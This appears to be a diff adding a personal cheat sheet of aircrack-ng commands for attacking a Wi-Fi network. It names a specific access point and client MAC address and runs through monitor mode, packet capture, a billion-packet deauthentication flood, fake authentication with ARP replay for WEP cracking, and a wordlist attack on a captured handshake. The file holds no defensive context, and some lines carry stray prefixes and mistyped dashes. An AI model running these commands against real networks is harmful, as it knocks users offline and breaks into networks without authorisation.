@@ -1,0 +1,34 @@
+
+iwconfig
+airmon-ng start wlan0
+
+a.ifconfig wlan0 down
+airmon-ng check kill 
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+
+//iw dev wlan0 disconnect     ,  ifconfig wlan0 down  ,  iwconfig wlan0 mode monitor
+airodump-ng wlan0
+airodump-ng --band a wlan0
+
+airodump-ng wlan0
+airodump-ng --bssid 22:09:6B:6F:79:17 --ch 11 wlan0
+airodump-ng --bssid 22:09:6B:6F:79:17 --ch 11 --write test.txt wlan0
+wireshark test.txt-15.cap
+airodump-ng –bssid 22:09:6B:6F:79:17 --channel 11 wlan0
+
+aireplay-ng --deauth 1000000000 –a 22:09:6B:6F:79:17 –c 52:A8:2F:E8:36:EA wlan0
+airodump-ng –bssid 22:09:6B:6F:79:17 --channel 11 --write test_wep wlan0
+aircrack-ng test_wep.cap 
+
+//fake auth
+airodump-ng –bssid 22:09:6B:6F:79:17 --channel 11 --write arpreplay wlan0
+a.ifconfig
+a.aireplay-ng --fakeauth 0 –a 22:09:6B:6F:79:17  -h 6E:75:8F:1B:4C:A7 wlan0
+a.aireplay-ng –arpreplay –b 22:09:6B:6F:79:17 -h 6E:75:8F:1B:4C:A7 wlan0
+i.aircrack-ng arpreplay-01.cap
+
+nano password.txt
+aircrack-ng wifitest-01.cap -w password.txt
+ip route
